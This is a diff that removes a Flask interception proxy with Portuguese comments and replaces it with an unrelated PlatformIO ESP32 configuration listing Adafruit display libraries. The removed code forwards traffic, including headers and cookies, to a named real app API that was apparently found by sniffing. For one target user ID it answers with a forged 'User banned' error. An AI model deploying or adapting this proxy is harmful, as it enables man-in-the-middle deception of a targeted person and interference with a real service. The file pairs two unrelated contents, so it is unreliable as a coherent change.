@@ -1,40 +1,8 @@
-import requests
-from flask import Flask, request
-import logging
-
-app = Flask(__name__)
-
-# ID do usuário a ser banido (copiar da rede)
-USER_ID_ALVO = "1234567890"  # SUBSTITUA AQUI
-
-# Endpoint real do app (descoberto via sniff ou análise)
-TARGET_API = "https://gw.litatom.com/api/v1"
-
-# Habilitar logs pra depurar
-logging.basicConfig(level=logging.INFO)
-
-@app.before_request
-def interceptar_request():
-    if USER_ID_ALVO in request.url or USER_ID_ALVO in request.data.decode('utf-8', errors='ignore'):
-        logging.info(f"ID {USER_ID_ALVO} detectado — respondendo banido")
-        return "{\"status\":\"error\",\"message\":\"User banned: motivo desconhecido\"}", 403
-
-@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
-def repassar_request(path):
-    try:
-        r = requests.request(
-            method=request.method,
-            url=f"{TARGET_API}/{path}",
-            headers=dict(request.headers),
-            data=request.data if request.data else None,
-            cookies=request.cookies,
-            params=request.args,
-            timeout=10,
-        )
-        return r.content, r.status_code
-    except Exception as e:
-        logging.error(f"Erro ao repassar: {e}")
-        return "{\"status\":\"error\",\"message\":\"Servidor ocupado\"}", 503
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080, debug=False)
+[env:esp32dev]
+platform = espressif32
+board = esp32dev
+framework = arduino
+lib_deps = 
+    adafruit/Adafruit SSD1306 @ ^2.5.7
+    adafruit/Adafruit GFX Library @ ^1.11.5
+    adafruit/Adafruit BusIO @ ^1.14.5
